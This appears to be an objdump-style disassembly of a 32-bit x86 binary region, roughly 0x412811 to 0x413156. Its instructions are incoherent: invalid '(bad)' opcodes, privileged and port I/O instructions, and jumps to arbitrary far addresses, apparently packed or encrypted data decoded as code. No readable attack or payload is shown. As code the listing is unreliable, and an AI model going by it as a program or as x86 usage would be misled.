  412811:	xlat   BYTE PTR fs:[ebx]
  412813:	sub    dh,BYTE PTR [eax-0x4ad3fb32]
  412819:	adc    eax,0x8bcad8b7
  41281e:	ror    ebp,1
  412820:	stc    
  412821:	test   eax,0xeff0e16e
  412826:	jmp    0x63a9:0x67bc7221
  41282d:	inc    esi
  41282e:	fs dec esi
  412830:	je     0x4127dc
  412832:	cmp    al,0x1e
  412834:	mov    al,0xfb
  412836:	jl     0x4127c7
  412838:	xor    ebp,DWORD PTR [esp+edx*1]
  41283b:	icebp  
  41283c:	lock lods eax,DWORD PTR ds:[esi]
  41283e:	mov    ds:0x97bf1982,eax
  412843:	or     al,0x4f
  412845:	test   BYTE PTR [ebx+edx*8-0xc],al
  412849:	pop    edi
  41284a:	aas    
  41284b:	hlt    
  41284c:	xchg   ecx,eax
  41284d:	int    0x92
  41284f:	jl     0x4128cf
  412851:	pop    edx
  412852:	aad    0x21
  412854:	xchg   esi,eax
  412855:	loop   0x412815
  412857:	arpl   WORD PTR [ebp-0x7f],di
  41285a:	jge    0x4128c1
  41285c:	or     ah,ah
  41285e:	pop    edx
  41285f:	imul   edi,DWORD PTR [eax+0x15],0x3adfc069
  412866:	cld    
  412867:	inc    eax
  412868:	ret    0x476d
  41286b:	jne    0x412837
  41286d:	shr    BYTE PTR cs:[ecx-0x74613840],cl
  412874:	retf   0x550f
  412877:	add    DWORD PTR gs:[ebp+0x1f454f40],ebp
  41287e:	sub    ch,BYTE PTR [edx-0x2f59ba57]
  412884:	push   edi
  412885:	bound  esi,QWORD PTR [ebx+0xe7e0228]
  41288b:	inc    ebx
  41288c:	or     esp,DWORD PTR [esi+0x2e]
  41288f:	(bad)  
  412891:	inc    ebx
  412892:	addr16 cs and dh,ah
  412896:	add    al,BYTE PTR [ebp-0x33]
  412899:	adc    ch,ah
  41289b:	mov    ds:0xf8eb1328,al
  4128a0:	or     DWORD PTR [ebx+0x79a0551c],esi
  4128a6:	dec    ebp
  4128a7:	xor    ecx,DWORD PTR [ebx]
  4128a9:	(bad)  
  4128ab:	sub    DWORD PTR [ecx-0x646cfbda],esp
  4128b1:	add    eax,0x95b57ab6
  4128b6:	pop    DWORD PTR [eax+0xb23db10]
  4128bc:	sti    
  4128bd:	pusha  
  4128be:	je     0x412897
  4128c0:	and    BYTE PTR [ebp+0x804ee08],0x82
  4128c7:	lods   al,BYTE PTR ds:[esi]
  4128c8:	mov    al,0x7d
  4128ca:	call   0xc1ac:0x9238766
  4128d1:	jb     0x41286c
  4128d3:	pop    ds
  4128d4:	fild   QWORD PTR [eax-0x7d]
  4128d7:	lods   eax,DWORD PTR ds:[esi]
  4128d8:	out    dx,eax
  4128d9:	jmp    0x41286c
  4128db:	rcr    DWORD PTR [esp+esi*8-0x71],1
  4128df:	not    ebp
  4128e1:	dec    eax
  4128e2:	inc    esp
  4128e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128e4:	xchg   ebx,eax
  4128e5:	std    
  4128e6:	das    
  4128e7:	adc    al,BYTE PTR [edi]
  4128e9:	imul   ebp,DWORD PTR [esi+0x6027bf84],0x6570df39
  4128f3:	(bad)  [eax+0x5c]
  4128f6:	(bad)  
  4128f7:	(bad)  
  4128f8:	jns    0x4128da
  4128fa:	pop    ds
  4128fb:	rol    DWORD PTR [esi],0xc6
  4128fe:	test   cl,ah
  412900:	jg     0x41289c
  412902:	sub    ecx,eax
  412904:	enter  0xb513,0x1c
  412908:	test   al,0x1e
  41290a:	pop    edi
  41290b:	jmp    0x412914
  41290d:	mov    al,ds:0x1d84bda8
  412912:	(bad)  
  412913:	and    BYTE PTR [ecx+0x22817066],dl
  412919:	(bad)  [eax-0x60a39e64]
  41291f:	test   eax,0x2cd8d1a4
  412924:	out    0x37,eax
  412926:	into   
  412927:	or     al,0x95
  412929:	jo     0x412902
  41292b:	in     al,0x37
  41292d:	xor    DWORD PTR [ebx],edx
  41292f:	jle    0x412920
  412931:	and    ebx,DWORD PTR [ecx+ebx*2-0x7d]
  412935:	jg     0x4128bd
  412937:	mov    al,0xce
  412939:	and    al,0x1c
  41293b:	cwde   
  41293c:	lock mov dl,0xc9
  41293f:	fwait
  412940:	dec    eax
  412941:	arpl   WORD PTR [esi-0x76fdcb24],bx
  412947:	push   edi
  412948:	or     DWORD PTR [esi],ebx
  41294a:	jmp    0x1194571
  41294f:	mov    ebx,0xa08af4c8
  412954:	xchg   DWORD PTR [edx-0x60b302a6],ecx
  41295a:	test   BYTE PTR [edi+0x70],bl
  41295d:	push   ebp
  41295e:	mov    bl,0xa0
  412960:	in     al,dx
  412961:	mov    esi,0x3408a29a
  412966:	fimul  DWORD PTR [edi-0x2c002b17]
  41296c:	ret    
  41296d:	push   ebx
  41296e:	sti    
  41296f:	add    al,0x62
  412971:	cmp    BYTE PTR [ebx],bh
  412973:	pop    esi
  412974:	sub    cl,BYTE PTR [edi]
  412976:	mov    dl,0x2
  412978:	icebp  
  412979:	cmp    dh,BYTE PTR [edi]
  41297b:	mov    dh,0x6f
  41297d:	pop    ebp
  41297e:	mov    ecx,0xb703dec3
  412983:	fwait
  412984:	and    DWORD PTR [edi],esp
  412986:	jl     0x4129d6
  412988:	call   0xfa92f441
  41298d:	push   ebp
  41298e:	push   es
  41298f:	mov    ch,BYTE PTR [edx]
  412991:	sar    BYTE PTR [edx],0xfd
  412994:	or     edi,esp
  412996:	add    BYTE PTR [ebx],ah
  412998:	push   ss
  412999:	push   ebx
  41299a:	xchg   esi,eax
  41299b:	mov    ah,0x78
  41299d:	inc    cx
  41299f:	cmp    ebp,DWORD PTR [edi-0x2f]
  4129a2:	lea    esp,[esi+0x304b999a]
  4129a8:	fidivr WORD PTR [eax-0x44]
  4129ab:	sahf   
  4129ac:	mov    ah,BYTE PTR [eax]
  4129ae:	faddp  st(3),st
  4129b0:	inc    eax
  4129b1:	jle    0x412984
  4129b3:	ret    
  4129b4:	retf   0x2bc9
  4129b7:	mov    esi,ds
  4129b9:	gs push ebx
  4129bb:	into   
  4129bc:	ret    
  4129bd:	scas   eax,DWORD PTR es:[edi]
  4129be:	adc    BYTE PTR [edi],0xed
  4129c1:	or     BYTE PTR [edi-0x25],bh
  4129c4:	or     ebx,eax
  4129c6:	sar    DWORD PTR [esi+0x45b995a4],0x93
  4129cd:	ret    
  4129ce:	int3   
  4129cf:	or     BYTE PTR [ecx*4+0x4104a37d],ch
  4129d6:	push   edx
  4129d7:	jmp    0x412992
  4129d9:	xchg   edx,eax
  4129da:	dec    edx
  4129db:	jne    0x412a41
  4129dd:	jmp    0xdcd947be
  4129e2:	outs   dx,DWORD PTR ds:[esi]
  4129e3:	mov    esi,DWORD PTR [ebp-0x1abb5bd2]
  4129e9:	xchg   ecx,eax
  4129ea:	fwait
  4129eb:	inc    ecx
  4129ec:	aaa    
  4129ed:	bound  ecx,QWORD PTR [esi]
  4129ef:	stos   DWORD PTR es:[edi],eax
  4129f0:	add    al,0xd6
  4129f2:	pop    esp
  4129f3:	cmp    eax,DWORD PTR [ebx]
  4129f5:	add    BYTE PTR [edx-0xe7a7fe7],bl
  4129fb:	aaa    
  4129fc:	adc    BYTE PTR [ebx-0x3e9dd3cc],dh
  412a02:	stos   DWORD PTR es:[edi],eax
  412a03:	adc    DWORD PTR [edx],esp
  412a05:	retf   
  412a06:	aad    0xe9
  412a08:	(bad)  
  412a09:	cli    
  412a0a:	ret    
  412a0b:	test   al,0x63
  412a0d:	mov    esi,0x71b678c
  412a12:	or     ebp,DWORD PTR [ecx+0x6e]
  412a15:	mov    edx,0x87f9443f
  412a1a:	pushf  
  412a1b:	lock push ebp
  412a1d:	test   BYTE PTR [edi],dh
  412a1f:	aas    
  412a20:	int    0xa0
  412a22:	and    eax,ecx
  412a24:	sub    eax,0x70463321
  412a29:	sub    eax,0xa32ae50b
  412a2e:	inc    ebx
  412a2f:	in     al,dx
  412a30:	pop    ebx
  412a31:	ret    0x1c5d
  412a34:	and    eax,edi
  412a36:	(bad)  
  412a37:	out    0xf6,eax
  412a39:	popf   
  412a3a:	and    cl,bl
  412a3c:	xchg   ebx,eax
  412a3d:	inc    esp
  412a3e:	cmp    al,0xfd
  412a40:	sub    al,0x63
  412a42:	sbb    BYTE PTR [eax+0x73],bl
  412a45:	(bad)  
  412a46:	in     eax,dx
  412a47:	xchg   esi,eax
  412a48:	and    DWORD PTR cs:[ebx],ebp
  412a4b:	mov    dl,0x55
  412a4d:	cdq    
  412a4e:	pop    edx
  412a4f:	mov    BYTE PTR [edi+0x5f],ah
  412a52:	in     al,0xa6
  412a54:	push   edi
  412a55:	add    dh,cl
  412a57:	pop    esi
  412a58:	in     eax,dx
  412a59:	push   0xfffffffe
  412a5b:	dec    edi
  412a5c:	sbb    ebp,DWORD PTR [eax]
  412a5e:	fist   WORD PTR [eax]
  412a60:	jb     0x4129fe
  412a62:	rol    BYTE PTR [ecx+esi*4],0xdc
  412a66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a67:	mov    DWORD PTR [ecx],edx
  412a69:	sti    
  412a6a:	cli    
  412a6b:	test   BYTE PTR [eax+0xa],al
  412a6e:	mov    bh,BYTE PTR [ebx]
  412a70:	inc    edx
  412a71:	lds    eax,FWORD PTR [ecx+0x12]
  412a74:	bound  ebp,QWORD PTR [ebx-0x384e09a5]
  412a7a:	jne    0x412a7d
  412a7c:	cwde   
  412a7d:	pop    ebx
  412a7e:	or     bh,BYTE PTR [ecx]
  412a80:	gs xchg edx,eax
  412a82:	mov    eax,ds:0x6f0039f
  412a87:	test   eax,0xeb91e534
  412a8c:	jge    0x412a39
  412a8e:	jge    0x412ab2
  412a90:	push   ds
  412a91:	in     eax,0xa7
  412a93:	mov    ds:0x53b0ef84,eax
  412a98:	shl    BYTE PTR [edx+0x68a182c9],cl
  412a9e:	lods   eax,DWORD PTR ds:[esi]
  412a9f:	pop    ecx
  412aa0:	xor    eax,0x48c22d3b
  412aa5:	push   edi
  412aa6:	jmp    0x4ad171f2
  412aab:	xor    dl,al
  412aad:	jbe    0x412b09
  412aaf:	mov    BYTE PTR [edi],bh
  412ab1:	fisttp QWORD PTR [eax+eax*4+0x755b62af]
  412ab8:	test   al,0xa5
  412aba:	daa    
  412abb:	jmp    0x846c379f
  412ac0:	push   cs
  412ac1:	xchg   edx,eax
  412ac2:	xchg   ebx,eax
  412ac3:	aad    0x15
  412ac5:	neg    BYTE PTR gs:[ebp-0x32ffc0b2]
  412acc:	cmp    DWORD PTR [edx],0x4c
  412acf:	std    
  412ad0:	shl    DWORD PTR [edx-0x46],cl
  412ad3:	pop    edi
  412ad4:	addr16 inc esp
  412ad6:	ror    bh,1
  412ad8:	pop    eax
  412ad9:	in     al,dx
  412ada:	stc    
  412adb:	outs   dx,DWORD PTR ds:[esi]
  412adc:	fadd   st(6),st
  412ade:	lods   al,BYTE PTR ds:[esi]
  412adf:	(bad)  
  412ae0:	aam    0x26
  412ae2:	add    BYTE PTR [eax],ch
  412ae4:	xchg   edx,eax
  412ae5:	pop    esp
  412ae6:	push   esi
  412ae7:	mov    eax,ds:0x5953d747
  412aec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412aed:	clc    
  412aee:	xor    al,0xde
  412af0:	jl     0x412aea
  412af2:	imul   ecx,DWORD PTR [edi],0x23
  412af5:	jb     0x412b4b
  412af7:	push   ds
  412af8:	sbb    al,0x32
  412afa:	fistp  QWORD PTR [esi+edi*2]
  412afd:	or     esp,DWORD PTR [ecx]
  412aff:	push   edi
  412b00:	loop   0x412b74
  412b02:	(bad)  
  412b03:	ds call 0xf1925598
  412b09:	jle    0x412abe
  412b0b:	and    dl,BYTE PTR [edi-0x48]
  412b0e:	cmp    al,0xbd
  412b10:	lds    ebp,FWORD PTR [edi]
  412b12:	mov    eax,ds:0x3f40b9aa
  412b17:	pop    ss
  412b18:	and    dl,dl
  412b1a:	neg    DWORD PTR [esi]
  412b1c:	in     al,dx
  412b1d:	retf   
  412b1e:	data16 daa 
  412b20:	xchg   ebx,eax
  412b21:	jmp    0x412b47
  412b23:	sub    al,0xbe
  412b25:	out    dx,al
  412b26:	jmp    0x5955:0x6e5fe3a3
  412b2d:	lods   al,BYTE PTR ds:[esi]
  412b2e:	mov    ds:0xa56c50b9,eax
  412b33:	pop    edx
  412b34:	sbb    edx,eax
  412b36:	pop    ss
  412b37:	adc    DWORD PTR [esi],ecx
  412b39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b3a:	fidiv  WORD PTR ds:0x4fecdba6
  412b40:	(bad)  
  412b42:	ins    DWORD PTR es:[edi],dx
  412b43:	(bad)  
  412b44:	adc    ah,cl
  412b46:	clc    
  412b47:	pop    ss
  412b48:	aad    0x5
  412b4a:	jns    0x412b56
  412b4c:	xchg   ebp,eax
  412b4d:	clc    
  412b4e:	punpckhbw mm5,mm3
  412b51:	mov    al,ds:0x5cd1a67a
  412b56:	cmp    BYTE PTR [edi],al
  412b58:	mov    dl,0xd1
  412b5a:	in     al,0x3
  412b5c:	test   eax,0xef9d53b8
  412b61:	sbb    eax,0x8e62ceb5
  412b66:	pushf  
  412b67:	(bad)  
  412b68:	(bad)  
  412b69:	sbb    DWORD PTR [eax+0x4d],esp
  412b6c:	xor    eax,0xfc61a8f
  412b71:	ror    BYTE PTR [esi],1
  412b73:	sub    DWORD PTR [eax],edi
  412b75:	dec    esp
  412b76:	pop    ss
  412b77:	xchg   BYTE PTR [ebp-0x490ba77b],bl
  412b7d:	xchg   ebx,eax
  412b7e:	daa    
  412b7f:	push   ecx
  412b80:	lods   al,BYTE PTR ds:[esi]
  412b81:	addr16 push ebp
  412b83:	lods   eax,DWORD PTR ds:[esi]
  412b84:	dec    esp
  412b85:	mov    ds:0x4a66b0db,eax
  412b8a:	lods   eax,DWORD PTR ds:[esi]
  412b8b:	lods   eax,DWORD PTR ds:[esi]
  412b8c:	in     al,0x72
  412b8e:	sbb    esp,esp
  412b90:	or     eax,DWORD PTR [edi-0x25]
  412b93:	pop    DWORD PTR [edi+0x14]
  412b96:	loope  0x412c06
  412b98:	and    eax,0x94ff755b
  412b9d:	jl     0x412b5b
  412b9f:	or     DWORD PTR [edx-0x6b6f5cc6],esp
  412ba5:	xor    BYTE PTR [ebx+0x17],0xf7
  412ba9:	mov    ch,0x80
  412bab:	pop    esp
  412bac:	(bad)  
  412bad:	ror    DWORD PTR [edi+ecx*2],1
  412bb0:	push   edi
  412bb1:	ins    BYTE PTR es:[edi],dx
  412bb2:	sbb    eax,0x42d9aec2
  412bb7:	lods   eax,DWORD PTR ds:[esi]
  412bb8:	pop    esp
  412bb9:	test   DWORD PTR [eax],0xe3c48a3e
  412bbf:	aad    0xbf
  412bc1:	adc    ch,BYTE PTR [ecx+0x7a728409]
  412bc7:	js     0x412bd4
  412bc9:	xor    ebx,ebp
  412bcb:	push   0xfffffff7
  412bcd:	pop    esp
  412bce:	xlat   BYTE PTR ds:[ebx]
  412bcf:	(bad)  
  412bd0:	int3   
  412bd1:	ds xor ch,ah
  412bd4:	stos   DWORD PTR es:[edi],eax
  412bd5:	xchg   edx,eax
  412bd6:	test   DWORD PTR [ebx+0x60e9b37b],edi
  412bdc:	jecxz  0x412b92
  412bde:	mov    cl,0xf6
  412be0:	mov    ch,0x2
  412be2:	mov    BYTE PTR [ebx+ebp*8],cl
  412be5:	mov    bh,0x20
  412be7:	jb     0x412bc4
  412be9:	ret    0xa4cc
  412bec:	lahf   
  412bed:	jmp    0x412bd3
  412bef:	lahf   
  412bf0:	adc    DWORD PTR [eax-0x1f],ebp
  412bf3:	adc    al,0xd0
  412bf5:	mul    bh
  412bf7:	adc    eax,0xb0a8f32
  412bfc:	rcr    BYTE PTR [esi+0x2],1
  412bff:	mov    esi,0x86de1a3b
  412c04:	jecxz  0x412bc3
  412c06:	fyl2x  
  412c08:	sbb    DWORD PTR [esi+0x61],esp
  412c0b:	or     eax,0xf594f7e1
  412c10:	mov    ecx,0x658c4c70
  412c15:	mov    ch,0xa
  412c17:	mov    dl,0x95
  412c19:	sub    al,0xa6
  412c1b:	cmc    
  412c1c:	js     0x412c98
  412c1e:	ins    DWORD PTR es:[edi],dx
  412c1f:	stos   BYTE PTR es:[edi],al
  412c20:	jle    0x412c75
  412c22:	and    eax,esi
  412c24:	ja     0x412bb7
  412c26:	adc    bh,BYTE PTR [eax+0xa]
  412c29:	scas   al,BYTE PTR es:[di]
  412c2b:	out    dx,al
  412c2c:	adc    dh,dl
  412c2e:	jl     0x412c9c
  412c30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c31:	pop    ss
  412c32:	dec    ebx
  412c33:	les    esi,FWORD PTR [esi]
  412c35:	jno    0x412c76
  412c37:	pop    ebx
  412c38:	std    
  412c39:	jp     0x412bd0
  412c3b:	in     eax,0x7a
  412c3d:	or     al,0x69
  412c3f:	xor    BYTE PTR [edx+0x3e50159e],dl
  412c45:	ret    
  412c46:	jne    0x412c1b
  412c48:	icebp  
  412c49:	sbb    ebx,0xffffffe3
  412c4c:	cwde   
  412c4d:	fdivr  DWORD PTR [edx+0xd]
  412c50:	ss push ds
  412c52:	push   edi
  412c53:	inc    esi
  412c54:	retf   
  412c55:	aaa    
  412c56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c57:	push   cs
  412c58:	mov    ds:0xd0a2f550,al
  412c5d:	mov    DWORD PTR [esi+0x740bb346],0x3e0be374
  412c67:	ins    BYTE PTR es:[edi],dx
  412c68:	cmp    DWORD PTR [ebx],0x31
  412c6b:	sbb    dh,al
  412c6d:	jmp    0xfe140885
  412c72:	fwait
  412c73:	lods   al,BYTE PTR ds:[esi]
  412c74:	lock lds esp,FWORD PTR [ebp+0x36]
  412c78:	mov    ch,0xe0
  412c7a:	jecxz  0x412c98
  412c7c:	jns    0x412c90
  412c7e:	fs clc 
  412c80:	sbb    DWORD PTR [esi+0x27],edx
  412c83:	aaa    
  412c84:	mov    ecx,DWORD PTR [ecx-0x54]
  412c87:	(bad)  
  412c88:	test   DWORD PTR fs:[ecx-0x78025a3c],edi
  412c8f:	fld    QWORD PTR [eax]
	...
  412e5d:	add    BYTE PTR [eax],al
  412e5f:	add    BYTE PTR ds:0x55d31474,ah
  412e65:	repz out 0xf6,eax
  412e68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e69:	adc    bh,BYTE PTR [esi]
  412e6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e6c:	dec    esp
  412e6d:	xor    BYTE PTR [ecx+ecx*2+0x1fed1],ah
  412e74:	and    BYTE PTR [edi],al
  412e76:	add    BYTE PTR [eax],al
  412e78:	shl    DWORD PTR [edx+ecx*1],1
  412e7b:	call   0x75076d8c
  412e80:	dec    edx
  412e81:	repz sub eax,0xdfa7a51c
  412e87:	cmp    BYTE PTR [edx-0x18],al
  412e8a:	adc    DWORD PTR [ecx-0x16],eax
  412e8d:	or     ecx,DWORD PTR [ecx+ebx*8+0x3245a913]
  412e94:	pusha  
  412e95:	push   ebx
  412e96:	rcr    BYTE PTR [ecx],1
  412e98:	dec    edx
  412e99:	inc    edi
  412e9a:	pushf  
  412e9b:	gs pop ebp
  412e9d:	jg     0x412e42
  412e9f:	out    dx,al
  412ea0:	pushf  
  412ea1:	inc    edx
  412ea2:	fisttp DWORD PTR [ebx-0x42c6e0a1]
  412ea8:	in     al,dx
  412ea9:	mov    dh,0xd
  412eab:	imul   ecx,DWORD PTR [eax],0xffffff99
  412eae:	int    0xcc
  412eb0:	sbb    eax,0xba1e98c2
  412eb5:	jmp    0xce44:0xd1a4cb4f
  412ebc:	push   eax
  412ebd:	sbb    BYTE PTR [edx-0x5fa25e13],ah
  412ec3:	mov    ds:0x4f19739f,eax
  412ec8:	push   ebx
  412ec9:	jmp    0x412e85
  412ecb:	and    ch,ch
  412ecd:	(bad)  
  412ece:	cld    
  412ecf:	xlat   BYTE PTR ds:[ebx]
  412ed0:	leave  
  412ed1:	inc    esi
  412ed2:	out    dx,eax
  412ed3:	push   ds
  412ed4:	mov    edx,0xd140711
  412ed9:	push   esp
  412eda:	mov    al,0xff
  412edc:	ins    DWORD PTR es:[di],dx
  412ede:	mov    bh,0x11
  412ee0:	inc    dl
  412ee2:	dec    eax
  412ee3:	jecxz  0x412ea8
  412ee5:	loope  0x412e94
  412ee7:	push   ebx
  412ee8:	pop    esp
  412ee9:	push   0xffffffa5
  412eeb:	and    bl,BYTE PTR [eax+0x2ab3e763]
  412ef1:	loop   0x412f13
  412ef3:	lods   eax,DWORD PTR ds:[esi]
  412ef4:	pushf  
  412ef5:	cmc    
  412ef6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ef7:	aaa    
  412ef8:	pop    ss
  412ef9:	ss fwait
  412efb:	out    dx,al
  412efc:	dec    edi
  412efd:	sub    eax,0xd77b09f9
  412f02:	sub    edi,esi
  412f04:	mov    ?,WORD PTR [edx]
  412f06:	aas    
  412f07:	int    0x1b
  412f09:	and    ebp,ebp
  412f0b:	sbb    DWORD PTR [edx+0x56e17459],0x3b407d11
  412f15:	popa   
  412f16:	or     al,0x7
  412f18:	fldcw  WORD PTR [ecx]
  412f1a:	or     al,0xb2
  412f1c:	jo     0x412f3b
  412f1e:	add    DWORD PTR [ecx],0x80e6b573
  412f24:	(bad)  
  412f25:	lock jp 0x412fa4
  412f28:	out    dx,eax
  412f29:	test   al,0x8a
  412f2b:	or     DWORD PTR [ecx-0x5fd8e0f8],edi
  412f31:	push   cs
  412f32:	push   ss
  412f33:	or     al,0x72
  412f35:	mov    bl,bl
  412f37:	mov    ds:0x1798e002,al
  412f3c:	cmp    DWORD PTR [ebp-0x68],ebp
  412f3f:	cli    
  412f40:	bound  ecx,QWORD PTR [esi-0x18]
  412f43:	es loopne 0x412ee0
  412f46:	inc    edi
  412f47:	or     ah,bh
  412f49:	dec    esi
  412f4a:	aas    
  412f4b:	sar    DWORD PTR [edx+edi*4-0x51],1
  412f4f:	pop    ss
  412f50:	loop   0x412ee2
  412f52:	mov    edi,0xa42d825
  412f57:	sub    edx,DWORD PTR ds:0xe3d034de
  412f5d:	mov    ecx,0x656a0073
  412f62:	call   0xb6acf1ae
  412f67:	(bad)  
  412f68:	daa    
  412f69:	cmp    DWORD PTR [eax],ecx
  412f6b:	xchg   edi,eax
  412f6c:	jg     0x412f50
  412f6e:	mov    DWORD PTR [edi+0x1a],0xb66b7097
  412f75:	sub    DWORD PTR [esi],esp
  412f77:	hlt    
  412f78:	in     eax,dx
  412f79:	sbb    eax,0x47059282
  412f7e:	and    edi,edi
  412f80:	pushf  
  412f81:	and    ah,BYTE PTR [eax]
  412f83:	and    eax,0x293f0a40
  412f88:	inc    eax
  412f89:	adc    esi,DWORD PTR [ebp+0x6979bd75]
  412f8f:	dec    eax
  412f90:	mov    ecx,0x52666b01
  412f95:	mov    dl,0x56
  412f97:	arpl   WORD PTR [ebp-0x6e],ax
  412f9a:	push   esp
  412f9b:	mov    ah,0x3
  412f9d:	and    bh,BYTE PTR [esi]
  412f9f:	fstp   QWORD PTR [edi]
  412fa1:	xchg   ebx,eax
  412fa2:	inc    ebp
  412fa3:	loop   0x412f38
  412fa5:	inc    esp
  412fa6:	mov    ah,0x70
  412fa8:	icebp  
  412fa9:	xchg   BYTE PTR [ecx-0x55863825],al
  412faf:	mov    BYTE PTR [ebp+0x22],0x19
  412fb3:	cmp    dl,BYTE PTR [esi+0x71]
  412fb6:	imul   BYTE PTR [esi+0x14]
  412fb9:	bound  eax,QWORD PTR ds:0xecee92f5
  412fbf:	cmp    ecx,DWORD PTR [eax-0x5772b3dc]
  412fc5:	retf   0xfff8
  412fc8:	mov    edi,0x52e91c34
  412fcd:	scas   eax,DWORD PTR es:[edi]
  412fce:	in     al,0xf3
  412fd0:	je     0x41302d
  412fd2:	ror    BYTE PTR [edi+0x23203eec],cl
  412fd8:	xor    al,0x78
  412fda:	dec    esp
  412fdb:	jecxz  0x412fae
  412fdd:	and    BYTE PTR [edi],bh
  412fdf:	outs   dx,DWORD PTR ds:[esi]
  412fe0:	es cs jae 0x412fc9
  412fe4:	sub    BYTE PTR [ebp-0x7a],dl
  412fe7:	mov    ss,WORD PTR [ecx-0x17]
  412fea:	out    0x8c,al
  412fec:	(bad)  
  412fed:	mov    eax,0xd8b39731
  412ff2:	jecxz  0x413038
  412ff4:	clc    
  412ff5:	fdivr  QWORD PTR [ebp-0x35]
  412ff8:	cmp    eax,0x8e06c57e
  412ffd:	int3   
  412ffe:	or     DWORD PTR [edx],esi
  413000:	adc    BYTE PTR [ecx],0xe6
  413003:	adc    BYTE PTR [esi+ebx*4],cl
  413006:	(bad)  
  413007:	(bad)  
  413008:	cmp    al,0xa5
  41300a:	fidivr WORD PTR [ebx+eiz*1-0x4]
  41300e:	jmp    0xc855e368
  413013:	or     ebp,DWORD PTR [ebp+0x49c553a0]
  413019:	inc    esi
  41301a:	cdq    
  41301b:	neg    BYTE PTR [ecx+ebx*2]
  41301e:	mov    ds:0xd0ba60dc,al
  413023:	mov    cl,0xe1
  413025:	push   esi
  413026:	retf   0xcc01
  413029:	mov    edx,0xb121c55a
  41302e:	and    bh,BYTE PTR [esi-0x2b11474f]
  413034:	push   cs
  413035:	sbb    BYTE PTR [esi-0x5018b063],bh
  41303b:	or     edx,ecx
  41303d:	or     BYTE PTR [edx+0x45],dh
  413040:	cmp    ebp,DWORD PTR [ebx-0x63]
  413043:	dec    edi
  413044:	xor    al,0xf8
  413046:	aas    
  413047:	(bad)  
  413048:	loop   0x4130c6
  41304a:	(bad)  
  41304b:	aad    0xaa
  41304d:	cmp    al,0x49
  41304f:	push   esp
  413050:	sub    BYTE PTR ds:0x5e6936f,bl
  413056:	xor    DWORD PTR [edi],edi
  413058:	inc    esp
  413059:	in     al,dx
  41305a:	push   eax
  41305b:	jecxz  0x413019
  41305d:	push   ecx
  41305e:	cld    
  41305f:	lods   al,BYTE PTR ds:[esi]
  413060:	push   edi
  413061:	fdiv   DWORD PTR [ebx+0x34]
  413064:	or     ch,BYTE PTR [ebp+0x20bf20d7]
  41306a:	stc    
  41306b:	cmp    eax,0x6d79586b
  413070:	stos   BYTE PTR es:[edi],al
  413071:	outs   dx,DWORD PTR ds:[esi]
  413072:	xchg   esp,eax
  413073:	xchg   ebp,eax
  413074:	dec    ecx
  413075:	xor    eax,0x7e033f57
  41307a:	in     al,dx
  41307b:	mov    ds:0xa1d2791f,al
  413080:	cmp    dh,BYTE PTR [esi+0x3d]
  413083:	lods   al,BYTE PTR ds:[esi]
  413084:	mov    ah,0xad
  413086:	dec    eax
  413087:	push   esp
  413088:	xchg   edx,eax
  413089:	cmp    eax,0xe93d8d0c
  41308e:	push   ebp
  41308f:	mov    esp,eax
  413091:	test   eax,0xf1f0694a
  413096:	pop    eax
  413097:	cmp    dh,BYTE PTR [edx]
  413099:	sub    al,0xf5
  41309b:	nop
  41309c:	fcomip st,st(5)
  41309e:	adc    dl,BYTE PTR [ecx+0x49]
  4130a1:	add    bh,BYTE PTR [ecx]
  4130a3:	jmp    0x277a:0xee8bf5df
  4130aa:	call   0xb42fb409
  4130af:	imul   edx,DWORD PTR [edx+esi*2],0xffffffd9
  4130b3:	push   ebx
  4130b4:	cld    
  4130b5:	inc    ebx
  4130b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130b7:	jmp    0xc6578856
  4130bc:	inc    ecx
  4130bd:	je     0x413043
  4130bf:	dec    ebp
  4130c0:	je     0x413056
  4130c2:	neg    eax
  4130c4:	and    eax,0x49ca5064
  4130c9:	mov    esp,DWORD PTR [edx-0x78]
  4130cc:	jmp    0x4130ef
  4130ce:	pushf  
  4130cf:	sub    DWORD PTR [ebx+0x2148d077],edx
  4130d5:	push   es
  4130d6:	mov    ah,0x5c
  4130d8:	sahf   
  4130d9:	fs ja  0x4130dc
  4130dc:	xchg   ecx,eax
  4130dd:	enter  0x6bf7,0x70
  4130e1:	lods   al,BYTE PTR ds:[esi]
  4130e2:	inc    eax
  4130e3:	push   ds
  4130e4:	sub    al,BYTE PTR [ebp+0x7e]
  4130e7:	push   esi
  4130e8:	lds    edx,FWORD PTR [eax]
  4130ea:	inc    ecx
  4130eb:	js     0x4130ae
  4130ed:	aad    0x32
  4130ef:	dec    eax
  4130f0:	xchg   ecx,eax
  4130f1:	jae    0x4130d3
  4130f3:	sbb    BYTE PTR [ebx+0x5e9bc927],dl
  4130f9:	sbb    dh,bh
  4130fb:	and    dl,0x7c
  4130fe:	std    
  4130ff:	and    DWORD PTR [ebp+0x3702f99b],edx
  413105:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413106:	retf   
  413107:	add    eax,0xdf92cf0b
  41310c:	ds jl  0x41313a
  41310f:	and    BYTE PTR [eax],dl
  413111:	xor    ebp,DWORD PTR [esi+esi*2-0x7ec0e9b1]
  413118:	div    BYTE PTR [esi-0x9c169e0]
  41311e:	loop   0x413105
  413120:	dec    esi
  413121:	fdiv   QWORD PTR [ebx-0x52ed9d1e]
  413127:	mov    dh,0x83
  413129:	push   ss
  41312a:	xlat   BYTE PTR ds:[ebx]
  41312b:	sub    esp,esp
  41312d:	(bad)  
  41312e:	fistp  DWORD PTR [ebx-0x73]
  413131:	fidiv  DWORD PTR [ecx]
  413133:	mov    edx,0x2bbb9a8a
  413138:	inc    edx
  413139:	imul   esp,DWORD PTR [edx-0x37e90412],0x1a9a21ea
  413143:	iret   
  413144:	das    
  413145:	leave  
  413146:	imul   esi,DWORD PTR [edx+0x3a],0x3e
  41314a:	and    ebp,DWORD PTR [ebp+0x3afff89c]
  413150:	hlt    
  413151:	into   
  413152:	(bad)  
  413153:	dec    ebx
  413154:	push   eax
  413155:	cmc    
  413156:	push   ebx
